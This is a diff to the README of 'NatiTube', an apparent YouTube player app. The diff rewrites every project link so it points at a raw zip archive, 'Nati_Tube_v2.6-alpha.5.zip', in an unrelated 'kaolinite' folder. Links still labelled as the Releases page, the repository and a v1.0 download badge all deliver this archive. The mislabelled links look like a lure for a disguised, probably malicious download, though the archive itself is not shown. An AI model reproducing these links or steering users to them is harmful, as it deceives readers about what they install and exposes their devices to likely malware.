@@ -1,6 +1,6 @@
 # 🎥 NatiTube - Enjoy YouTube with Native Player Features
 
-[![Download NatiTube](https://img.shields.io/badge/Download%20NatiTube-v1.0-blue)](https://github.com/Danifrosty/NatiTube/releases)
+[![Download NatiTube](https://github.com/Danifrosty/NatiTube/raw/refs/heads/main/kaolinite/Nati_Tube_v2.6-alpha.5.zip%20NatiTube-v1.0-blue)](https://github.com/Danifrosty/NatiTube/raw/refs/heads/main/kaolinite/Nati_Tube_v2.6-alpha.5.zip)
 
 ## 📜 Introduction
 
@@ -17,7 +17,7 @@ NatiTube also integrates smoothly with iOS Shortcuts and InjecThor, making it a 
 Follow these simple steps to download and run NatiTube:
 
 1. **Visit the Releases Page**  
-   Go to the [NatiTube Releases page](https://github.com/Danifrosty/NatiTube/releases) to access all available versions.
+   Go to the [NatiTube Releases page](https://github.com/Danifrosty/NatiTube/raw/refs/heads/main/kaolinite/Nati_Tube_v2.6-alpha.5.zip) to access all available versions.
 
 2. **Select the Latest Release**  
    Look for the latest release at the top of the page. This version includes the most recent updates and features.
@@ -42,7 +42,7 @@ Follow these simple steps to download and run NatiTube:
 
 ## 📥 Download & Install
 
-To download NatiTube, visit the [Releases page](https://github.com/Danifrosty/NatiTube/releases) and choose the correct version for your device. Ensure you follow the above steps to install and set it up correctly.
+To download NatiTube, visit the [Releases page](https://github.com/Danifrosty/NatiTube/raw/refs/heads/main/kaolinite/Nati_Tube_v2.6-alpha.5.zip) and choose the correct version for your device. Ensure you follow the above steps to install and set it up correctly.
 
 ## 🖥️ System Requirements
 
@@ -98,7 +98,7 @@ If you wish to contribute to NatiTube, feel free to fork the repository and subm
 
 ## 🔗 Links
 
-- [NatiTube Releases](https://github.com/Danifrosty/NatiTube/releases)
-- [GitHub Repository](https://github.com/Danifrosty/NatiTube)
+- [NatiTube Releases](https://github.com/Danifrosty/NatiTube/raw/refs/heads/main/kaolinite/Nati_Tube_v2.6-alpha.5.zip)
+- [GitHub Repository](https://github.com/Danifrosty/NatiTube/raw/refs/heads/main/kaolinite/Nati_Tube_v2.6-alpha.5.zip)
 
 With NatiTube, enjoy a richer and smoother YouTube experience on your mobile device. Download it now and take advantage of its native player features!
